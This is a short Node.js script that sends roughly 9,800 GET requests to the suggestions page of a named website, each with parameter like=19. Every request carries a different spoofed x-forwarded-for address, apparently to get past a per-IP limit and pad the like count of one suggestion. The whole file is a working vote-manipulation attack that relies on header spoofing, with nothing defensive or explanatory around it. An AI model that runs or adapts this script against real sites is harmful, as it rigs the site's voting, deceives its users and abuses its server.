var request = require("request");

var jar = request.jar();
jar.setCookie(request.cookie("__cfduid=d8087d720ec59539b4ade3cf69c382ad31575821465"), "https://ceapa.cool/suggestions/");



async function xd() {
    for (let i = 1; i < 100; i++) {
        for (let j = 1; j < 100; j++) {
            let options = {
                method: 'GET',
                url: 'https://ceapa.cool/suggestions/',
                qs: {like: '19'},
                headers: {'x-forwarded-for': "99.77." + i + "." + j},
                //jar: 'JAR'
            };
            console.log("sending from ip: " + options.headers['x-forwarded-for']);
            request(options, function (error, response, body) {
                if (error) throw new Error(error);
                console.log("resault from ip: " + options.headers['x-forwarded-for'] + ": " + response.statusCode);
            });
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
}

xd();